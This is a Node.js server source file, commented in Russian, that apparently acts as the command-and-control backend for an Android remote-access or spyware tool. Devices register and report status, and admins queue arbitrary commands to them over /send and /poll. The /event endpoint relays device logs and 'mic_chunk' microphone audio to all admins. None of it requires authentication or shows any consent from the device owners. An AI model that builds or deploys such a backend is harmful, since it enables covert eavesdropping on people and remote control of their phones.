const http = require('http');
const url = require('url');

const PORT = process.env.PORT || 10000;

// deviceId -> { name, network, battery, android, lastSeen, queue: [] }
const clients = new Map();

// adminId -> { lastSeen, queue: [] }
const admins = new Map();

function send(res, code, obj) {
    res.writeHead(code, {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end(JSON.stringify(obj));
}

function readBody(req) {
    return new Promise((resolve) => {
        let data = '';
        req.on('data', c => data += c);
        req.on('end', () => {
            try { resolve(JSON.parse(data || '{}')); }
            catch (e) { resolve({}); }
        });
    });
}

const server = http.createServer(async (req, res) => {
    if (req.method === 'OPTIONS') return send(res, 200, { ok: true });

    const parsed = url.parse(req.url, true);
    const path = parsed.pathname;
    const q = parsed.query;

    if (path === '/' || path === '/health') {
        return send(res, 200, { ok: true, time: Date.now() });
    }

    // === РЕГИСТРАЦИЯ ===
    if (path === '/register') {
        const body = await readBody(req);
        const role = body.role || 'client';
        const id = body.deviceId || 'unknown';

        if (role === 'admin') {
            admins.set(id, { lastSeen: Date.now(), queue: [] });
            console.log('[+] admin online: ' + id);
        } else {
            const existing = clients.get(id) || {};
            clients.set(id, {
                name: body.name || existing.name || '',
                network: body.network || existing.network || '',
                battery: body.battery || existing.battery || 0,
                android: body.android || existing.android || '',
                lastSeen: Date.now(),
                queue: existing.queue || []
            });
            console.log('[+] client online: ' + id);
        }
        return send(res, 200, { ok: true });
    }

    // === ОПРОС ===
    if (path === '/poll') {
        const role = q.role || 'client';
        const id = q.id || 'unknown';

        if (role === 'admin') {
            const devices = [];
            for (const [did, c] of clients) {
                devices.push({
                    id: did,
                    name: c.name,
                    network: c.network,
                    battery: c.battery,
                    android: c.android,
                    online: Date.now() - c.lastSeen < 20000,
                    lastSeen: c.lastSeen
                });
            }
            const adminData = admins.get(id);
            const adminQueue = adminData ? adminData.queue : [];
            if (adminData) {
                adminData.queue = [];
                adminData.lastSeen = Date.now();
            }

            return send(res, 200, {
                ok: true,
                devices: devices,
                queue: adminQueue
            });
        }

        // Клиенту — очередь команд
        const c = clients.get(id);
        if (!c) {
            return send(res, 200, { ok: false, reason: 'not_registered', queue: [] });
        }
        c.lastSeen = Date.now();
        const queue = c.queue;
        c.queue = [];
        return send(res, 200, { ok: true, queue: queue });
    }

    // === ОТПРАВКА КОМАНДЫ (от админа) ===
    if (path === '/send') {
        const body = await readBody(req);
        const target = body.target;
        const cmd = body.cmd;
        const payload = body.payload || {};

        const c = clients.get(target);
        if (!c) return send(res, 404, { ok: false, error: 'offline' });

        // ВАЖНО: type: 'command' — чтобы клиент понял
        c.queue.push({ type: 'command', cmd, payload, ts: Date.now() });
        console.log('[cmd] ' + target + ' <- ' + cmd);
        return send(res, 200, { ok: true });
    }

    // === СОБЫТИЯ ОТ КЛИЕНТА ===
    if (path === '/event') {
        const body = await readBody(req);
        const id = body.deviceId || q.id || 'unknown';
        const t = body.type || '';

        const c = clients.get(id) || { queue: [] };
        c.lastSeen = Date.now();

        if (t === 'status') {
            c.name = body.name || c.name;
            c.network = body.network || c.network;
            c.battery = typeof body.battery === 'number' ? body.battery : c.battery;
            c.android = body.android || c.android;
        } else if (t === 'log') {
            for (const [, a] of admins) {
                a.queue.push({
                    type: 'log',
                    deviceId: id,
                    message: body.message || '',
                    ts: Date.now()
                });
            }
        } else if (t === 'volume') {
            for (const [, a] of admins) {
                a.queue.push({
                    type: 'volume',
                    deviceId: id,
                    value: body.value || 0,
                    ts: Date.now()
                });
            }
        } else if (t === 'mic_chunk') {
            for (const [, a] of admins) {
                a.queue.push({
                    type: 'mic_chunk',
                    deviceId: id,
                    data: body.data || '',
                    ts: Date.now()
                });
            }
        }

        clients.set(id, c);
        return send(res, 200, { ok: true });
    }

    send(res, 404, { ok: false });
});

// Очистка старых
setInterval(() => {
    const now = Date.now();
    for (const [id, c] of clients) {
        if (now - c.lastSeen > 120000) {
            clients.delete(id);
            console.log('[-] client removed: ' + id);
        }
    }
    for (const [id, a] of admins) {
        if (now - a.lastSeen > 120000) {
            admins.delete(id);
            console.log('[-] admin removed: ' + id);
        }
    }
}, 30000);

server.listen(PORT, () => console.log('Server on port ' + PORT));
